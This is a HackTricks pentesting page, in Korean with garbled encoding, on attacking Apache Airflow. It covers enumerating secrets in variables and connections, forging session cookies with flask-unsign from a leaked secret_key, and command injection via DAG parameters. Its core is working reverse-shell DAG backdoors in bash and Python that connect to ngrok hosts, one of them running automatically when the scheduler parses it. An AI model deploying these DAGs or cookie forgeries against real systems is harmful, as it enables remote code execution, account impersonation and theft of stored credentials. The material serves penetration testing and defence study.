# Apache Airflow ë³´ì•ˆ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

[**Apache Airflow**](https://airflow.apache.org)ëŠ” **ë°ì´í„° íŒŒì´í”„ë¼ì¸ ë˜ëŠ” ì›Œí¬í”Œë¡œìš°ë¥¼ ì¡°ì •í•˜ê³  ì˜ˆì•½í•˜ëŠ” í”Œë«í¼**ìœ¼ë¡œ ì‘ë™í•©ë‹ˆë‹¤. ë°ì´í„° íŒŒì´í”„ë¼ì¸ì˜ ë§¥ë½ì—ì„œ "ì¡°ì •"ì´ë€ ë‹¤ì–‘í•œ ì†ŒìŠ¤ì—ì„œ ë°œìƒí•˜ëŠ” ë³µì¡í•œ ë°ì´í„° ì›Œí¬í”Œë¡œìš°ë¥¼ ë°°ì—´, ì¡°ì • ë° ê´€ë¦¬í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¡°ì •ëœ ë°ì´í„° íŒŒì´í”„ë¼ì¸ì˜ ì£¼ìš” ëª©ì ì€ ì²˜ë¦¬ëœ ë° ì‚¬ìš© ê°€ëŠ¥í•œ ë°ì´í„° ì„¸íŠ¸ë¥¼ ì œê³µí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ë°ì´í„° ì„¸íŠ¸ëŠ” ë¹„ì¦ˆë‹ˆìŠ¤ ì¸í…”ë¦¬ì „ìŠ¤ ë„êµ¬, ë°ì´í„° ê³¼í•™ ë° ë¨¸ì‹ ëŸ¬ë‹ ëª¨ë¸ì„ ë¹„ë¡¯í•œ ë‹¤ì–‘í•œ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ë„ë¦¬ í™œìš©ë˜ë©°, ì´ëŠ” ëŒ€ê·œëª¨ ë°ì´í„° ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ê¸°ëŠ¥ì— ê¸°ì´ˆí•©ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ Apache Airflowë¥¼ ì‚¬ìš©í•˜ë©´ **ì½”ë“œ ì‹¤í–‰ì„ ì¼ì • ì‹œê°„ì— ì˜ˆì•½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë¡œì»¬ ë©

### Docker-Compose

[**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)ì˜ **ë„ì»¤-ì»´í¬ì¦ˆ êµ¬ì„± íŒŒì¼ì„ ì‚¬ìš©í•˜ì—¬** ì™„ì „í•œ ì•„íŒŒì¹˜ ì—ì–´í”Œë¡œìš° ë„ì»¤ í™˜ê²½ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (MacOSì—ì„œëŠ” ë„ì»¤ VMì— ì ì–´ë„ 6GBì˜ RAMì„ í• ë‹¹í•´ì•¼ í•©ë‹ˆë‹¤).

### Minikube

Apache Airflowë¥¼ ì‹¤í–‰í•˜ëŠ” **í•œ ê°€ì§€ ì‰¬ìš´ ë°©ë²•**ì€ **minikubeë¡œ ì‹¤í–‰**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow êµ¬ì„±

AirflowëŠ” êµ¬ì„±ì—ì„œ **ë¯¼ê°í•œ ì •ë³´**ë¥¼ ì €ì¥í•  ìˆ˜ ìˆê±°ë‚˜ ì·¨ì•½í•œ êµ¬ì„±ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflowë¥¼ ê³µê²©í•˜ê¸° ì „ì— **ê¶Œí•œì´ ì‘ë™í•˜ëŠ” ë°©ì‹**ì„ ì´í•´í•´ì•¼ í•©ë‹ˆë‹¤:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## ê³µê²©

### ì›¹ ì½˜ì†” ì—´ê±°

ì›¹ ì½˜ì†”ì— **ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆë‹¤ë©´ ë‹¤ìŒ ì •ë³´ ì¤‘ ì¼ë¶€ ë˜ëŠ” ëª¨ë‘ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ë³€ìˆ˜** (ì‚¬ìš©ì ì§€ì • ë¯¼ê°í•œ ì •ë³´ê°€ ì—¬ê¸°ì— ì €ì¥ë  ìˆ˜ ìˆìŒ)
* **ì—°ê²°** (ì‚¬ìš©ì ì§€ì • ë¯¼ê°í•œ ì •ë³´ê°€ ì—¬ê¸°ì— ì €ì¥ë  ìˆ˜ ìˆìŒ)
* `http://<airflow>/connection/list/`ì—ì„œ ì•¡ì„¸ìŠ¤
* [**êµ¬ì„±**](./#airflow-configuration) (**`secret_key`** ë° ë¹„ë°€ë²ˆí˜¸ì™€ ê°™ì€ ë¯¼ê°í•œ ì •ë³´ê°€ ì—¬ê¸°ì— ì €ì¥ë  ìˆ˜ ìˆìŒ)
* ì‚¬ìš©ì ë° ì—­í•  ëª©ë¡
* ê° DAGì˜ **ì½”ë“œ** (í¥ë¯¸ë¡œìš´ ì •ë³´ê°€ í¬í•¨ë  ìˆ˜ ìˆìŒ)

### ë³€ìˆ˜ ê°’ ê²€ìƒ‰

ë³€ìˆ˜ëŠ” Airflowì— ì €ì¥ë˜ì–´ **DAG**ê°€ ê·¸ ê°’ì„ **ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë¥¸ í”Œë«í¼ì˜ ë¹„ë°€ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. **ì¶©ë¶„í•œ ê¶Œí•œ**ì´ ìˆë‹¤ë©´ GUIì—ì„œ `http://<airflow>/variable/list/`ì—ì„œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê¸°ë³¸ì ìœ¼ë¡œ AirflowëŠ” GUIì—ì„œ ë³€ìˆ˜ì˜ ê°’ì„ í‘œì‹œí•˜ì§€ë§Œ, [**ì´**](https://marclamberti.com/blog/variables-with-apache-airflow/)ì— ë”°ë¥´ë©´ **GUI**ì—ì„œ **ë³€ìˆ˜ì˜ ê°’**ì´ **ë³„í‘œ**ë¡œ í‘œì‹œë  ìˆ˜ ìˆëŠ” **ë³€ìˆ˜ ëª©ë¡**ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (164).png>)

ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ **ê°’**ì€ ì—¬ì „íˆ **CLI**(DB ì•¡ì„¸ìŠ¤ í•„ìš”), **ì„ì˜ì˜ DAG** ì‹¤í–‰, **API**ë¥¼ í†µí•œ ë³€ìˆ˜ ì—”ë“œí¬ì¸íŠ¸ ì•¡ì„¸ìŠ¤(í™œì„±í™”ëœ API í•„ìš”) ë° **ì‹¬ì§€ì–´ GUI ìì²´**ë¥¼ í†µí•´ **ê²€ìƒ‰**í•˜ì—¬ **ê²€ìƒ‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
GUIì—ì„œ ì´ëŸ¬í•œ ê°’ì„ ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ ì•¡ì„¸ìŠ¤í•˜ë ¤ëŠ” **ë³€ìˆ˜**ë¥¼ ì„ íƒí•˜ê³  **ì‘ì—… -> ë‚´ë³´ë‚´ê¸°**ë¥¼ í´ë¦­í•˜ë©´ ë©ë‹ˆë‹¤.\
ë‹¤ë¥¸ ë°©ë²•ì€ **ìˆ¨ê²¨ì§„ ê°’**ì„ **ê²€ìƒ‰ í•„í„°ë§**ì„ ì‚¬ìš©í•˜ì—¬ **ë¬´ì°¨ë³„ ëŒ€ì…**í•˜ì—¬ ì–»ì„ ë•Œê¹Œì§€ **ê²€ìƒ‰**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (152).png>)

### ê¶Œí•œ ìƒìŠ¹

**`expose_config`** êµ¬ì„±ì´ **True**ë¡œ ì„¤ì •ëœ ê²½ìš° **ì‚¬ìš©ì ì—­í• ** ë° **ì´ìƒ**ì—ì„œ **ì›¹ì—ì„œ êµ¬ì„±ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ êµ¬ì„±ì—ëŠ” **`secret_key`**ê°€ ë‚˜íƒ€ë‚˜ë©°, ì´ëŠ” í•´ë‹¹ ìœ íš¨í•œ ì‚¬ìš©ìê°€ **ìì²´ ì„œëª…ëœ ì¿ í‚¤ë¥¼ ìƒì„±í•˜ì—¬ ë‹¤ë¥¸ ì‚¬ìš©ì ê³„ì •ì„ í‘œí˜„**í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG ë°±ë„ì–´ (Airflow ì›Œì»¤ì—ì„œì˜ RCE)

ë§Œì•½ **DAGê°€ ì €ì¥ëœ ìœ„ì¹˜ì— ì“°ê¸° ì•¡ì„¸ìŠ¤**ê°€ ìˆë‹¤ë©´, **í•˜ë‚˜ë¥¼ ìƒì„±**í•˜ì—¬ **ë¦¬ë²„ìŠ¤ ì…¸ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ì´ ë¦¬ë²„ìŠ¤ ì…¸ì€ **airflow ì›Œì»¤ ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ ì‹¤í–‰**ë  ê²ƒì…ë‹ˆë‹¤:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG ë°±ë„ì–´ (Airflow ìŠ¤ì¼€ì¤„ëŸ¬ì—ì„œì˜ RCE)

ë§Œì•½ ë¬´ì–¸ê°€ë¥¼ **ì½”ë“œì˜ ë£¨íŠ¸ì—ì„œ ì‹¤í–‰í•˜ë„ë¡ ì„¤ì •**í•˜ë©´, í˜„ì¬ ì‘ì„± ì‹œì ì—ì„œ, DAG í´ë” ë‚´ì— ë„£ì€ í›„ **ëª‡ ì´ˆ í›„ì— ìŠ¤ì¼€ì¤„ëŸ¬ì— ì˜í•´ ì‹¤í–‰**ë  ê²ƒì…ë‹ˆë‹¤.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG ìƒì„±

ë§Œì•½ **DAG í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ê¸°ê¸°ë¥¼ ì¹¨íˆ¬**í•œë‹¤ë©´, `dags/` í´ë”ì— ìƒˆë¡œìš´ **DAG ìŠ¤í¬ë¦½íŠ¸**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆê³ , ì´ëŠ” DAG í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ë‹¤ë¥¸ ê¸°ê¸°ë“¤ì— **ë³µì œë  ê²ƒ**ì…ë‹ˆë‹¤.

### DAG ì½”ë“œ ì‚½ì…

GUIì—ì„œ DAGë¥¼ ì‹¤í–‰í•  ë•Œ **ì¸ìˆ˜ë¥¼ ì „ë‹¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ, DAGê°€ ì˜¬ë°”ë¥´ê²Œ ì‘ì„±ë˜ì§€ ì•Šì€ ê²½ìš° **Command Injectionì— ì·¨ì•½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì´ ì´ CVEì—ì„œ ë°œìƒí•œ ì‚¬ë¡€ì…ë‹ˆë‹¤: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

**DAGsì—ì„œ ëª…ë ¹ ì‚½ì…ì„ ì°¾ê¸° ì‹œì‘í•˜ë ¤ë©´** ì•Œì•„ì•¼ í•  ê²ƒì€ **ë§¤ê°œë³€ìˆ˜**ê°€ **ì½”ë“œ**ë¡œ **`dag_run.conf.get("param_name")`**ë¡œ **ì•¡ì„¸ìŠ¤**ëœë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë˜í•œ, **ë³€ìˆ˜**ì—ì„œë„ ë™ì¼í•œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì¶©ë¶„í•œ ê¶Œí•œì´ ìˆë‹¤ë©´ GUIì—ì„œ **ë³€ìˆ˜ì˜ ê°’ì„ ì œì–´**í•  ìˆ˜ ìˆìŒì— ìœ ì˜í•˜ì‹­ì‹œì˜¤). ë³€ìˆ˜ëŠ” **ë‹¤ìŒê³¼ ê°™ì´ ì•¡ì„¸ìŠ¤**ë©ë‹ˆë‹¤:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
ë§Œì•½ ì´ë“¤ì´ ì˜ˆë¥¼ë“¤ì–´ bash ëª…ë ¹ì–´ ì•ˆì—ì„œ ì‚¬ìš©ëœë‹¤ë©´, command injectionì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ìš°ë¦¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ë‹¹ì‹ ì˜ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
